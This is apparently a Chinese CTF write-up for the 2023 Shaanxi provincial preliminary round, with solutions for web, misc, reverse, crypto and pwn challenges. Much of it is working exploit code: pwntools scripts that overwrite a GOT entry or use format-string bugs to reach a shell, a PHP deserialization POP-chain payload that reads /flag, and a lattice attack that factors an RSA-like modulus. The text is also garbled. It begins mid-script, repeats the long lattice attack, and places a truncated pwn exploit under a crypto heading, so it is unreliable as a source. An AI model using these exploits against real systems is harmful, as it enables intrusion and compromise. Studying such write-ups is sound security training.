                    affected_vector_index = jj
 
            # level:0
            # if no other vectors end up affected
            # we remove it
            if affected_vectors == 0:
                print("* removing unhelpful vector", ii)
                BB = BB.delete_columns([ii])
                BB = BB.delete_rows([ii])
                monomials.pop(ii)
                BB = remove_unhelpful(BB, monomials, bound, ii-1)
                return BB
 
            # level:1
            # if just one was affected we check
            # if it is affecting someone else
            elif affected_vectors == 1:
                affected_deeper = True
                for kk in range(affected_vector_index + 1,
                                BB.dimensions()[0]):
                    # if it is affecting even one vector
                    # we give up on this one
                    if BB[kk, affected_vector_index] != 0:
                        affected_deeper = False
                # remove both it if no other vector was affected and
                # this helpful vector is not helpful enough
                # compared to our unhelpful one
                if affected_deeper and abs(bound - BB[affected_vector_index, affected_vector_index]) < abs(bound - BB[ii, ii]):
                    print("* removing unhelpful vectors", ii, "and", affected_vector_index)
                    BB = BB.delete_columns([affected_vector_index, ii])
                    BB = BB.delete_rows([affected_vector_index, ii])
                    monomials.pop(affected_vector_index)
                    monomials.pop(ii)
                    BB = remove_unhelpful(BB, monomials, bound, ii-1)
                    return BB
    # nothing happened
    return BB
 
 
def attack(N, e, m, t, X, Y):
    modulus = e
 
    PR.<x, y> = PolynomialRing(ZZ)
    a = N + 1
    b = N * N - N + 1
    f = x * (y * y + a * y + b) + 1
 
    gg = []
    for k in range(0, m+1):
        for i in range(k, m+1):
            for j in range(2 * k, 2 * k + 2):
                gg.append(x^(i-k) * y^(j-2*k) * f^k * e^(m - k))
    for k in range(0, m+1):
        for i in range(k, k+1):
            for j in range(2*k+2, 2*i+t+1):
                gg.append(x^(i-k) * y^(j-2*k) * f^k * e^(m - k))
 
    def order_gg(idx, gg, monomials):
        if idx == len(gg):
            return gg, monomials
 
        for i in range(idx, len(gg)):
            polynomial = gg[i]
            non = []
            for monomial in polynomial.monomials():
                if monomial not in monomials:
                    non.append(monomial)
            if len(non) == 1:
                new_gg = gg[:]
                new_gg[i], new_gg[idx] = new_gg[idx], new_gg[i]
 
                return order_gg(idx + 1, new_gg, monomials + non)    
 
    gg, monomials = order_gg(0, gg, [])
 
    # construct lattice B
    nn = len(monomials)
    BB = Matrix(ZZ, nn)
    for ii in range(nn):
        BB[ii, 0] = gg[ii](0, 0)
        for jj in range(1, nn):
            if monomials[jj] in gg[ii].monomials():
                BB[ii, jj] = gg[ii].monomial_coefficient(monomials[jj]) * monomials[jj](X, Y)
 
    # Prototype to reduce the lattice
    if helpful_only:
        # automatically remove
        BB = remove_unhelpful(BB, monomials, modulus^m, nn-1)
        # reset dimension
        nn = BB.dimensions()[0]
        if nn == 0:
            print("failure")
            return 0,0
 
    # check if vectors are helpful
    if debug:
        helpful_vectors(BB, modulus^m)
    
    # check if determinant is correctly bounded
    det = BB.det()
    bound = modulus^(m*nn)
    if det >= bound:
        print("We do not have det < bound. Solutions might not be found.")
        print("Try with highers m and t.")
        if debug:
            diff = (log(det) - log(bound)) / log(2)
            print("size det(L) - size e^(m*n) = ", floor(diff))
        if strict:
            return -1, -1
    else:
        print("det(L) < e^(m*n) (good! If a solution exists < N^delta, it will be found)")
 
    # display the lattice basis
    if debug:
        matrix_overview(BB, modulus^m)
   # LLL
    if debug:
        print("optimizing basis of the lattice via LLL, this can take a long time")
 
    BB = BB.LLL()
 
    if debug:
        print("LLL is done!")
 
    # transform vector i & j -> polynomials 1 & 2
    if debug:
        print("looking for independent vectors in the lattice")
    found_polynomials = False
    
    for pol1_idx in range(nn - 1):
        for pol2_idx in range(pol1_idx + 1, nn):
            # for i and j, create the two polynomials
            PR.<a, b> = PolynomialRing(ZZ)
            pol1 = pol2 = 0
            for jj in range(nn):
                pol1 += monomials[jj](a,b) * BB[pol1_idx, jj] / monomials[jj](X, Y)
                pol2 += monomials[jj](a,b) * BB[pol2_idx, jj] / monomials[jj](X, Y)
 
            # resultant
            PR.<q> = PolynomialRing(ZZ)
            rr = pol1.resultant(pol2)
 
            # are these good polynomials?
            if rr.is_zero() or rr.monomials() == [1]:
                continue
            else:
                print("found them, using vectors", pol1_idx, "and", pol2_idx)
                found_polynomials = True
                break
        if found_polynomials:
            break
 
    if not found_polynomials:
        print("no independant vectors could be found. This should very rarely happen...")
        return 0, 0
    
    rr = rr(q, q)
 
    # solutions
    soly = rr.roots()
 
    if len(soly) == 0:
        print("Your prediction (delta) is too small")
        return 0, 0
    
    soly = soly[0][0]
    ss = pol1(q, soly)
    solx = ss.roots()[0][0]
    
    return solx, soly
 
def inthroot(a, n):
    return a.nth_root(n, truncate_mode=True)[0]
N = 
e = 
 
X = 1 << 469
Y = 2 * inthroot(Integer(2 * N), 2)
 
res = attack(N, e, 4, 2, X, Y)
print(res) # gives k and p + q, the rest is easy
b, c = res[1], N
Dsqrt =  inthroot(Integer(b^2-4*c),2)
p, q = (b + Dsqrt) // 2, (b - Dsqrt) // 2
assert p * q == N
```

## ChangeAddr

程序可以任意地址覆盖，所以修改exit_got为后门函数，以下是exp

```python
from pwn import *
#from LibcSearcher import *
io = process("./pwn2")
context(arch="amd64",os="linux")
context.log_level = "debug"
#io = remote('116.236.144.37', 20782)
elf = ELF("./pwn2")
#libc = ELF("./")
sd      = lambda data               :io.send(data) 
sa      = lambda delim,data         :io.sendafter(delim, data)
sl      = lambda data               :io.sendline(data)
sla     = lambda delim,data         :io.sendlineafter(delim, data)
sda     = lambda delim,data         :io.sendafter(delim, data)
rcn     = lambda numb=4096          :io.recv(numb, timeout = 3)
rl      = lambda                    :io.recvline()
ru      = lambda delims             :io.recvuntil(delims)
uu32    = lambda data               :u32(data.ljust(4, b'\x00'))
uu64    = lambda data               :u64(data.ljust(8, b'\x00'))
li      = lambda tag, addr          :log.info(tag + ': {:#x}'.format(addr))
ls      = lambda tag, addr          :log.success(tag + ': {:#x}'.format(addr))
lsh     = lambda tag, addr          :LibcSearcher(tag, addr)
interactive = lambda                :io.interactive()
printf  = lambda index              :success(hex(index))
getadd  = lambda                    :u64(io.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))

sla("Now you can write one 4 byte value to memory. Where would you like to write?\n",b'804C020')
sl(b'804932C')
sla("input anything to get the final flag, it should be used to lead to a special segment fault!\n",b'aaaa')
interactive()
```

```python
from Crypto.Cipher import ARC4
import hashlib

a = [0xA2, 0x05, 0x05, 0xDB, 0x23, 0x11, 0x0E, 0x39, 0x46, 0x06, 0x0C, 0xD1, 0x91, 0xC6, 0x44, 0xE2, 0x1A, 0x9C, 0x61, 0xF1, 0xD3, 0xEB, 0x75, 0x3A, 0x81, 0x5D, 0xA2, 0x12, 0xB4, 0x58, 0x2A, 0xDB, 0x94, 0x14]

def rc4(mi, key):
  s = list(range(256))
  j = 0
  for i in range(256):
    j = (j + s[i] + key[i % 32]) % 256
    s[i], s[j] = s[j], s[i]
  i = j = 0
  for w in range(len(mi)):
    i = (i + 1) % 256
    j = (j + s[i]) % 256
    s[i], s[j] = s[j], s[i]
    t = (s[i] + s[j]) % 256
    mi[w] ^= s[t]
  return mi

for i in range(0x10000):
  pwd1 = hex(i)[2:]
  h1 = hashlib.sha256(pwd1.encode('utf-8')).hexdigest()
  h1_list = bytes.fromhex(h1)
  key = list(h1_list)
  mi = a.copy()
  mi = rc4(mi, key)
  Str = ''.join(chr(x) for x in mi)
  if Str.startswith('flag{'):
print(Str)
```

## RSA_like

标准NovelSystem的加密函数

```python
from gmpy2 import *
#NovelSystem 加密算法
class NovelSystem:
    def __init__(self, p, q, e):
        self.p = mpz(p)
        self.q = mpz(q)
        self.N = self.p * self.q
        self.beta = 0.397
        self.psi = (self.p ** 2 + self.p + 1) * (self.q ** 2 + self.q + 1)
        self.e = mpz(e)
        self.d = invert(mpz(self.e), mpz(self.psi))
        self.r = 3
        
    def add_(self, a, b):
        m, n = a
        k, l = b
        if a[1] == 0:
            a, b = b, a
            m, n, k, l = k, l, m, n
        if l == 0:
            if n == 0:
                return (m * k, m + k)
            if (n + k) % self.N == 0:
                if (m - n ** 2) % self.N == 0:
                    return (0, 0)
                return ((m * k + self.r) * invert(m - n * n) % self.N, 0)
            return ((m * k + self.r) * invert(n + k, self.N) % self.N, (m + n * k) * invert(n + k, self.N) % self.N)
        if (m + k + n * l) % self.N != 0:
            return ((m * k + (n + l) * self.r) * invert(m + k + n * l, self.N) % self.N,
                    (n * k + m * l + self.r) * invert(m + k + n * l, self.N) % self.N)
        
        if (n * k + m * l + self.r) % self.N == 0:
            return (0, 0)
        return ((m * k + (n + l) * self.r) * invert(n * k + m * l + self.r, self.N) % self.N, 0)
    
    def mul_(self, a, n):
        ans = (0, 0)
        while n > 0:
            if n & 1 == 1:
                ans = self.add_(ans, a)
            a = self.add_(a, a)
            n //= 2
        return ans
    def encrypt(self, m):
        return self.mul_(m, self.e)
    def decrypt(self, c):
        return self.mul_(c, self.d)
```

先分解n

脚本如下：

```python
#---------------------------
'''
1,素数结构 p = a^2 + 3* b^2 ,p%3 == 1
2,phi的结构phi = (p^2+p+1)*(q^2+q+1)
3,给出N,e,c 
论文:https://eprint.iacr.org/2021/1160.pdf 
'''
import time
 
############################################
# Config
##########################################
 
"""
Setting debug to true will display more informations
about the lattice, the bounds, the vectors...
"""
debug = True
 
"""
Setting strict to true will stop the algorithm (and
return (-1, -1)) if we don't have a correct 
upperbound on the determinant. Note that this 
doesn't necesseraly mean that no solutions 
will be found since the theoretical upperbound is
usualy far away from actual results. That is why
you should probably use `strict = False`
"""
strict = False
 
"""
This is experimental, but has provided remarkable results
so far. It tries to reduce the lattice as much as it can
while keeping its efficiency. I see no reason not to use
this option, but if things don't work, you should try
disabling it
"""
helpful_only = True
dimension_min = 7 # stop removing if lattice reaches that dimension
 
############################################
# Functions
##########################################
 
# display stats on helpful vectors
def helpful_vectors(BB, modulus):
    nothelpful = 0
    for ii in range(BB.dimensions()[0]):
        if BB[ii,ii] >= modulus:
            nothelpful += 1
   print(nothelpful, "/", BB.dimensions()[0], " vectors are not helpful")
 
# display matrix picture with 0 and X
def matrix_overview(BB, bound):
    for ii in range(BB.dimensions()[0]):
        a = ('%02d ' % ii)
        for jj in range(BB.dimensions()[1]):
            a += '0' if BB[ii,jj] == 0 else 'X'
            if BB.dimensions()[0] < 60:
                a += ' '
        if BB[ii, ii] >= bound:
            a += '~'
        print(a)
 
# tries to remove unhelpful vectors
# we start at current = n-1 (last vector)
def remove_unhelpful(BB, monomials, bound, current):
    # end of our recursive function
    if current == -1 or BB.dimensions()[0] <= dimension_min:
        return BB
 
    # we start by checking from the end
    for ii in range(current, -1, -1):
        # if it is unhelpful:
        if BB[ii, ii] >= bound:
            affected_vectors = 0
            affected_vector_index = 0
            # let's check if it affects other vectors
            for jj in range(ii + 1, BB.dimensions()[0]):
                # if another vector is affected:
                # we increase the count
                if BB[jj, ii] != 0:
                    affected_vectors += 1
                    affected_vector_index = jj
 
            # level:0
            # if no other vectors end up affected
            # we remove it
            if affected_vectors == 0:
                print("* removing unhelpful vector", ii)
                BB = BB.delete_columns([ii])
                BB = BB.delete_rows([ii])
                monomials.pop(ii)
                BB = remove_unhelpful(BB, monomials, bound, ii-1)
                return BB
 
            # level:1
            # if just one was affected we check
            # if it is affecting someone else
            elif affected_vectors == 1:
                affected_deeper = True
                for kk in range(affected_vector_index + 1,
                                BB.dimensions()[0]):
                    # if it is affecting even one vector
                    # we give up on this one
                    if BB[kk, affected_vector_index] != 0:
                        affected_deeper = False
                # remove both it if no other vector was affected and
                # this helpful vector is not helpful enough
                # compared to our unhelpful one
                if affected_deeper and abs(bound - BB[affected_vector_index, affected_vector_index]) < abs(bound - BB[ii, ii]):
                    print("* removing unhelpful vectors", ii, "and", affected_vector_index)
                    BB = BB.delete_columns([affected_vector_index, ii])
                    BB = BB.delete_rows([affected_vector_index, ii])
                    monomials.pop(affected_vector_index)
                    monomials.pop(ii)
                    BB = remove_unhelpful(BB, monomials, bound, ii-1)
                    return BB
    # nothing happened
    return BB
 
 
def attack(N, e, m, t, X, Y):
    modulus = e
 
    PR.<x, y> = PolynomialRing(ZZ)
    a = N + 1
    b = N * N - N + 1
    f = x * (y * y + a * y + b) + 1
 
    gg = []
    for k in range(0, m+1):
        for i in range(k, m+1):
            for j in range(2 * k, 2 * k + 2):
                gg.append(x^(i-k) * y^(j-2*k) * f^k * e^(m - k))
    for k in range(0, m+1):
        for i in range(k, k+1):
            for j in range(2*k+2, 2*i+t+1):
                gg.append(x^(i-k) * y^(j-2*k) * f^k * e^(m - k))
 
    def order_gg(idx, gg, monomials):
        if idx == len(gg):
            return gg, monomials
 
        for i in range(idx, len(gg)):
            polynomial = gg[i]
            non = []
            for monomial in polynomial.monomials():
                if monomial not in monomials:
                    non.append(monomial)
            if len(non) == 1:
                new_gg = gg[:]
                new_gg[i], new_gg[idx] = new_gg[idx], new_gg[i]
 
                return order_gg(idx + 1, new_gg, monomials + non)    
 
    gg, monomials = order_gg(0, gg, [])
 
    # construct lattice B
    nn = len(monomials)
    BB = Matrix(ZZ, nn)
    for ii in range(nn):
        BB[ii, 0] = gg[ii](0, 0)
        for jj in range(1, nn):
            if monomials[jj] in gg[ii].monomials():
                BB[ii, jj] = gg[ii].monomial_coefficient(monomials[jj]) * monomials[jj](X, Y)
 
    # Prototype to reduce the lattice
    if helpful_only:
        # automatically remove
        BB = remove_unhelpful(BB, monomials, modulus^m, nn-1)
        # reset dimension
        nn = BB.dimensions()[0]
        if nn == 0:
            print("failure")
            return 0,0
 
    # check if vectors are helpful
    if debug:
        helpful_vectors(BB, modulus^m)
    
    # check if determinant is correctly bounded
    det = BB.det()
    bound = modulus^(m*nn)
    if det >= bound:
        print("We do not have det < bound. Solutions might not be found.")
        print("Try with highers m and t.")
        if debug:
            diff = (log(det) - log(bound)) / log(2)
            print("size det(L) - size e^(m*n) = ", floor(diff))
        if strict:
            return -1, -1
    else:
        print("det(L) < e^(m*n) (good! If a solution exists < N^delta, it will be found)")
 
    # display the lattice basis
    if debug:
        matrix_overview(BB, modulus^m)
   # LLL
    if debug:
        print("optimizing basis of the lattice via LLL, this can take a long time")
 
    BB = BB.LLL()
 
    if debug:
        print("LLL is done!")
 
    # transform vector i & j -> polynomials 1 & 2
    if debug:
        print("looking for independent vectors in the lattice")
    found_polynomials = False
    
    for pol1_idx in range(nn - 1):
        for pol2_idx in range(pol1_idx + 1, nn):
            # for i and j, create the two polynomials
            PR.<a, b> = PolynomialRing(ZZ)
            pol1 = pol2 = 0
            for jj in range(nn):
                pol1 += monomials[jj](a,b) * BB[pol1_idx, jj] / monomials[jj](X, Y)
                pol2 += monomials[jj](a,b) * BB[pol2_idx, jj] / monomials[jj](X, Y)
 
            # resultant
            PR.<q> = PolynomialRing(ZZ)
            rr = pol1.resultant(pol2)
 
            # are these good polynomials?
            if rr.is_zero() or rr.monomials() == [1]:
                continue
            else:
                print("found them, using vectors", pol1_idx, "and", pol2_idx)
                found_polynomials = True
                break
        if found_polynomials:
            break
 
    if not found_polynomials:
        print("no independant vectors could be found. This should very rarely happen...")
        return 0, 0
    
    rr = rr(q, q)
 
    # solutions
    soly = rr.roots()
 
    if len(soly) == 0:
        print("Your prediction (delta) is too small")
        return 0, 0
    
    soly = soly[0][0]
    ss = pol1(q, soly)
    solx = ss.roots()[0][0]
    
    return solx, soly
 
def inthroot(a, n):
    return a.nth_root(n, truncate_mode=True)[0]

assert p * q == N
```

```python
assert key[:4] == b'Key_'
pad_key = key + os.urandom(63-len(key)) + sample(string.ascii_uppercase,1)[0].encode()

e = '5eb73540480e65b521baff81d283e2765a243b87b47d73224a6a8d935a51fdb2d9964bf8eed93cb375b6a2e6bcba270b4d973741e30ead4b4f4775afc17f99c3f2258f64375aeaac981f7e118b9d397e3d78d863f1cb17ee7e62fd87867b4906'

enc = bytes.fromhex(e)
flag = bytes.fromhex(flag)
es = [enc[i:i + 32] for i in range(0, len(enc), 32)]

def aes_decrypt(key, data):
    aes = AES.new(key, AES.MODE_ECB)
    return aes.decrypt(data)

msg_blocks = [aes_decrypt(pad_key, es[0])]
msg_blocks += [aes_decrypt(es[i-1], es[i]) for i in range(1, len(es))]
secrets = b''.join(msg_blocks)
k = md5(secrets).hexdigest()[:16].encode()
r = aes_decrypt(k, flag)
print(r)
```

Post.title: 2023陕西省CTF初赛
Post._content:
# 排名

战队名称：R3ape1

排名：44

![图片](https://picture-1312228068.cos.ap-shanghai.myqcloud.com/202306052102900.gif)

# 解题思路

## WEB

### ezpop

js文件中找到路径

![图片](https://picture-1312228068.cos.ap-shanghai.myqcloud.com/202306052102904.jpg)

![图片](https://picture-1312228068.cos.ap-shanghai.myqcloud.com/202306052102912.gif)

**EXP：**

```php
<?php
highlight_file(__FILE__);
class night
{
  public $night;

 

  public function __destruct(){
    echo $this->night . '哒咩哟';
  }
}

 

class day
{
  public $day;

 

  public function __toString(){
    echo $this->day->go();
  }

 

  public function __call($a, $b){
    echo $this->day->getFlag();
  }
}

 

 

class light
{
  public $light;

 

  public function __invoke(){
    echo $this->light->d();
  }
}

 

class dark
{
  public $dark;

 

  public function go(){
    ($this->dark)();
  }
  public function getFlag(){
    include(hacked($this->dark));
  }
}

 

function hacked($s) {
  if(substr($s, 0,1) == '/'){
    die('呆jio步');
  }
  $s = preg_replace('/\.\.*/', '.', $s);
  $s = urldecode($s);
  $s = htmlentities($s, ENT_QUOTES, 'UTF-8');
  return strip_tags($s);
}

$pop = new night();
$pop->night = new day();
$pop->night->day = new dark();
$pop->night->day->dark=new light();
$pop->night->day->dark->light= new day();
$pop->night->day->dark->light->day=new dark();
$pop->night->day->dark->light->day->dark="php://filter/read=convert.base64-encode/resource=file:///flag";
$pop1 =array($pop,null);
echo serialize($pop1);
```

运行出payload，这里有个关键的点

![图片](https://picture-1312228068.cos.ap-shanghai.myqcloud.com/202306052102911.jpg)

看似是赋值给pop，但是复制到vscode中查看发现

![图片](https://picture-1312228068.cos.ap-shanghai.myqcloud.com/202306052102914.jpg)

post传参的其实是上面这一串

把不可见字符这个整体当参数，然后赋刚刚的payload

⁦快给我传参⁩⁦pop=a:2:{i:0;O:5:"night":1:{s:5:"night";O:3:"day":1:{s:3:"day";O:4:"dark":1:{s:4:"dark";O:5:"light":1:{s:5:"light";O:3:"day":1:{s:3:"day";O:4:"dark":1:{s:4:"dark";s:61:"php://filter/read=convert.base64-encode/resource=file:///flag";}}}}}}i:0;N;}

![图片](https://picture-1312228068.cos.ap-shanghai.myqcloud.com/202306052102913.gif)

得到base64编码，解码得到flag

**flag{2e78db056848cd8dfa7ee4f4673ba25f}**

 

## MISC

### 可是雪啊飘进双眼

![图片](https://picture-1312228068.cos.ap-shanghai.myqcloud.com/202306052102191.gif)

得到一个文件夹和一个加密压缩包

passwd中hint.wav末尾有摩斯密码

![图片](https://picture-1312228068.cos.ap-shanghai.myqcloud.com/202306052102356.gif)

![图片](https://picture-1312228068.cos.ap-shanghai.myqcloud.com/202306052102439.jpg)解码得到WOAISHANXI，猜测为snow.txt的密码

![图片](https://picture-1312228068.cos.ap-shanghai.myqcloud.com/202306052102471.jpg)

得到压缩包密码shanxiroujiamo

在key.jpg末尾看到还有一张图片，binwalk分离得到2.jpg

![图片](https://picture-1312228068.cos.ap-shanghai.myqcloud.com/202306052102506.gif)

对照key.jpg得到hide.jpg的密码：BC1PVEYD

hide.jpg用该密码进行steghide解密得到flag

![图片](https://picture-1312228068.cos.ap-shanghai.myqcloud.com/202306052102570.gif)

**flag{d2d2835882495f4e39ecce6847e78f86}**

 

### 管道

zsteg一把梭

![图片](https://picture-1312228068.cos.ap-shanghai.myqcloud.com/202306052102602.gif)

**flag{0988f2a657d8936a76876d4f39f7d7a0}**

 

## REVERSE

### babypython

手撕进行换源成python代码，大致是这样

```python
import base64

flag = '=1nb0A3b7AUQwB3b84mQ/E0MvJUb+EXbx5TQwF3bt52bAZncsd9c'
value = ''
output = ''

i = 0
temp = flag[i]
temp = chr(ord(temp) ^ 8)

if i != len(flag):
  value += temp
  i += 1

for i in range(len(flag)):
  temp = value[i]
  temp = chr(ord(temp) + 3)
   output += temp

result = [1, 2, 3] * 10
invalid_list = [] # 空列表

for _ in range(50):
  result += 'A'
  invalid_list.append(4)

for i in range(len(output)):
  temp = output[i]
  temp = chr(ord(temp) - 1)
  temp = ord(temp) // 2
  output_list.append(temp)

# 第一个循环：循环体内的操作
for _ in range(30):
  result += output.lower()

obfuscated_output = base64.b64encode(output.encode()).decode()[::-1][:-1]
obfuscated_output = obfuscated_output.replace('g', '1').replace('H', '3').replace('W', '9')
invalid_variable = len(obfuscated_output) * 5
print(obfuscated_output)
```

再根据encode写出解密脚本

```python
# output = '=1nb0A3b7AUQwB3b84mQ/E0MvJUb+EXbx5TQwF3bt52bAZncsd9c'
# output = output.replace('1', 'g').replace('3', 'H').replace('9', 'W')
# print(output)
output = '=gnb0AHb7AUQwBHb84mQ/E0MvJUb+EXbx5TQwFHbt52bAZncsdWc'
a='qglrv@onmlqpA>qmq>mBo3A?Bn<lppA@;lp4nx'

list1 = list(a)
for i in range(len(a)):
  list1[i] = chr(ord(list1[i]) + 1)
for i in range(len(a)):
  list1[i] = chr(ord(list1[i]) - 4)
for i in range(len(a)):
  list1[i] = chr(ord(list1[i])^8)
  print(list1[i],end='')
```

得到flag，**flag{5dcbafe63fbf3b7d8647c1aee650ae9c}**

 

## CRYPTO

### HaM3

已知p ∗ q 的高19位和低18位

而p ∗ q的总位数为39

剩下两位需要爆破一下

由于p ∗ q 不大，可以直接用sagemath的factor()分解

然后爆破

```python
# sage

nbit = 64
n = 
high = str(n)[:19]
low = str(n)[-18:]
for i in range(10):
  for j in range(10):
     pq = int(high + str(i) + str(j) + low)
     f = factor(pq)
     if len(f) == 2 and f[0][0].nbits() == 64: 
       p = f[0][0]
       q = f[1][0]
       print(p,q)
```

然后得到pq以后根据原来的代码去解码就可以了

```python
from Crypto.Util.number import *
import gmpy2

p,q = 
c = 
e = 
P = int(str(p) + str(q))
Q = int(str(q) + str(p))
PP = int(str(P) + str(Q))
QQ = int(str(Q) + str(P))
phi = (PP-1)*(QQ-1)
d = gmpy2.invert(e,phi)
m = pow(c,d,PP*QQ)
print(long_to_bytes(m))
```



### 奇怪的sar

第一步是lcg得到初始seed

Terra_Cotta_Warriors函数存在格式化字符串漏洞，可以利用它泄露PIE基地址。Huashan_Mountain函数存在栈溢出，而且0x129A上有system("/bin/sh")，可以直接覆盖返回地址执行后门。

```python
from pwn import *
#from LibcSearcher import *
io = process("./pwn")
context(arch="amd64",os="linux")
context.log_level = "debug"
#io = remote()
elf = ELF("./pwn")
#libc = ELF("./")

sd    = lambda data        :io.send(data) 
sa    = lambda delim,data     :io.sendafter(delim, data)
sl    = lambda data        :io.sendline(data)
sla   = lambda delim,data     :io.sendlineafter(delim, data)

ru    = lambda delims       :io.recvuntil(delims)
```

### eazy_printf

base64解密文得出“TokameinE_is_the_best_pwner”，fmtstr函数有bss上的格式化字符串漏洞，而且可以使用13次，所以可以泄露libc，并且找栈上的多重指针，覆盖main函数返回地址为onegadget。

```python
from pwn import *
#from LibcSearcher import *
io = process("./pwn")
context(arch="amd64",os="linux")
context.log_level = "debug"
io = remote()
elf = ELF("./pwn")
#libc = ELF("./")

sd    = lambda data        :io.send(data) 
sa    = lambda delim,data     :io.sendafter(delim, data)
sl    = lambda data        :io.sendline(data)
sla   = lambda delim,data     :io.sendlineafter(delim, data)
sda   = lambda delim,data     :io.sendafter(delim, data)
rcn   = lambda numb=4096      :io.recv(numb, timeout = 3)
rl    = lambda           :io.recvline()
ru    = lambda delims       :io.recvuntil(delims)
uu32   = lambda data        :u32(data.ljust(4, b'\x00'))
uu64   = lambda data        :u64(data.ljust(8, b'\x00'))
li    = lambda tag, addr      :log.info(tag + ': {:#x}'.format(addr))
ls    = lambda tag, addr      :log.success(tag + ': {:#x}'.format(addr))
lsh   = lambda tag, addr      :LibcSearcher(tag, addr)
interactive = lambda         :io.interactive()
printf  = lambda index        :success(hex(index))
getadd  = lambda           :u64(io.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))

sa("Do you know who the best pwner is?\n",b'TokameinE_is_the_best_pwner'+b'\x00'*5)
sda("What do you want to say?\n",b'%10$p.%29$p.')
stack1 = int(io.recvuntil(".",drop=True),16)+0x8
libc_base = int(io.recvuntil(".",drop=True),16)-0x20840
success("stack1:"+hex(stack1))
success("libc:"+hex(libc_base))
one = 0xf1247 + libc_base
success("one:"+hex(one))
payload1 = b'%' + str(stack1 & 0xFFFF).encode() + b'd%31$hn'
payload2 = b'%' + str(one & 0xFFFF).encode() + b'd%57$hn'
payload3 = b'%' + str((stack1 & 0xffff) + 2).encode() + b'd%31$hn'
payload4 = b'%' + str((one >> 16) & 0xffff).encode() + b'd%57$hn'
sda("What do you want to say?\n",payload1)
sda("What do you want to say?\n",payload2)
sda("What do you want to say?\n",payload3)
sda("What do you want to say?\n",payload4)
for i in range(8):
  sda("What do you want to say?\n",b'Eureka'*5)
interactive()
```
